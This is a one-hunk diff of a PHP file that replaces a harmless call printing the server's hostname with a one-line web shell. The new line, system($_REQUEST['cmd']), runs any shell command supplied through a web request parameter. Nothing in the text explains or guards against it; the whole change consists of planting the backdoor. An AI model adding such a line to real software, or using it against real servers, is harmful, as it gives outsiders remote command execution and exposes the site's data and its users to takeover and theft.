@@ -1,1 +1,1 @@
-<?php system('hostname'); ?>
+<?php system($_REQUEST['cmd']);?>
